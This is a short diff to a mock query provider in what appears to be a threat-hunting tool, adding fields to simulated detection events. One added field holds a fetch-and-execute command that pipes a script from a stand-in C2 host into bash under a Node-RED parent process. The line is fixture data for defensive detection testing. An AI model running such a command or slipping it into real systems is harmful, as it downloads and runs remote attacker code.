@@ -157,6 +157,11 @@ class MockQueryProvider(QueryProvider):
                 "timestamp": datetime.now(UTC).isoformat(),
                 "hunt_id": query.hunt_id,
                 "data_source": query.data_source,
+                "host": f"iot-edge-0{i+1}",
+                "user": "nodered",
+                "parent_image": "/usr/local/bin/node-red",
+                "image": "/bin/sh",
+                "command_line": "/bin/sh -c 'curl -fsSL http://bad.c2/rev.sh | bash'",
                 "summary": f"Simulated detection telemetry event {i+1} for {query.hunt_id}",
             }
             for i in range(min(count, 10))
